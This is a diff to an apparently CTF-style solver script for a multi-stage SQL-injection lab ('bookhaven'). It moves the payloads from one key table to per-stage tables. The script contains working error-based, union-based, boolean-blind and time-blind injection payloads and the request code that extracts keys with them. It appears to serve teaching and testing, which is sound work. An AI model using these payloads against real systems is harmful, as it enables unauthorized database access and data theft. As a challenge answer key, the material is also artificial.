@@ -7,7 +7,7 @@ stage's vulnerable query never runs at all until the *previous* stage's
 real key is supplied as that stage's `token` (checked with a safe,
 parameterized lookup in challenges/finals.py's _stage_key()). There is no
 shortcut, the only way to ever learn a stage's key is to run that
-stage's own technique against the real, seeded bookhaven_stage_keys table:
+stage's own technique against that stage's own seeded bookhaven_key_N table:
 
   Stage 1 (error-based):   extractvalue() leaks stage 1's key in a DBMS error.
   Stage 2 (union-based):   a UNION SELECT matching the 3-column result set
@@ -53,7 +53,7 @@ def stage1_error_based() -> str:
     identical technique to Phase 1's Netero's Recipe Vault (p1_2)."""
     payload = (
         "1' AND extractvalue(1,concat(0x3a,"
-        "(SELECT key_value FROM bookhaven_stage_keys WHERE stage=1)))-- -"
+        "(SELECT key_value FROM bookhaven_key_1)))-- -"
     )
     resp = requests.get(
         f"{BASE}/f/bookhaven/stage1", params={"id": payload}, timeout=10
@@ -81,8 +81,8 @@ def stage2_union_based(stage1_key: str) -> str:
     bookhaven_catalog's 3-column (id, title, author) shape, identical
     technique to Phase 1's Exam Results Board (p1_3)."""
     payload = (
-        "nonexistent' UNION SELECT stage,key_value,'x' "
-        "FROM bookhaven_stage_keys WHERE stage=2-- -"
+        "nonexistent' UNION SELECT 2,key_value,'x' "
+        "FROM bookhaven_key_2-- -"
     )
     resp = requests.get(
         f"{BASE}/f/bookhaven/stage2",
@@ -93,7 +93,7 @@ def stage2_union_based(stage1_key: str) -> str:
     body = resp.text
     if 'data-door="open"' not in body:
         raise RuntimeError("stage 2: token was not accepted, stage 1 key wrong?")
-    # The union'd row renders stage_keys.key_value into the <td> that
+    # The union'd row renders bookhaven_key_2.key_value into the <td> that
     # normally holds a book title.
     import re
 
@@ -130,8 +130,8 @@ def stage3_boolean_blind(stage2_key: str) -> str:
         while lo < hi:
             mid = (lo + hi + 1) // 2
             payload = (
-                "' OR LENGTH((SELECT key_value FROM bookhaven_stage_keys "
-                f"WHERE stage=3))>={mid}-- -"
+                "' OR LENGTH((SELECT key_value FROM bookhaven_key_3 "
+                f"))>={mid}-- -"
             )
             if stage3_oracle(stage2_key, payload):
                 lo = mid
@@ -145,7 +145,7 @@ def stage3_boolean_blind(stage2_key: str) -> str:
             mid = (lo + hi + 1) // 2
             payload = (
                 "' OR ASCII(SUBSTRING((SELECT key_value FROM "
-                f"bookhaven_stage_keys WHERE stage=3),{position},1))>={mid}-- -"
+                f"bookhaven_key_3),{position},1))>={mid}-- -"
             )
             if stage3_oracle(stage2_key, payload):
                 lo = mid
@@ -189,8 +189,8 @@ def stage4_time_blind(stage3_key: str) -> str:
         while lo < hi:
             mid = (lo + hi + 1) // 2
             cond = (
-                "LENGTH((SELECT key_value FROM bookhaven_stage_keys "
-                f"WHERE stage=4))>={mid}"
+                "LENGTH((SELECT key_value FROM bookhaven_key_4"
+                f"))>={mid}"
             )
             if oracle(cond):
                 lo = mid
@@ -203,8 +203,8 @@ def stage4_time_blind(stage3_key: str) -> str:
         while lo < hi:
             mid = (lo + hi + 1) // 2
             cond = (
-                "ASCII(SUBSTRING((SELECT key_value FROM bookhaven_stage_keys "
-                f"WHERE stage=4),{position},1))>={mid}"
+                "ASCII(SUBSTRING((SELECT key_value FROM bookhaven_key_4"
+                f"),{position},1))>={mid}"
             )
             if oracle(cond):
                 lo = mid
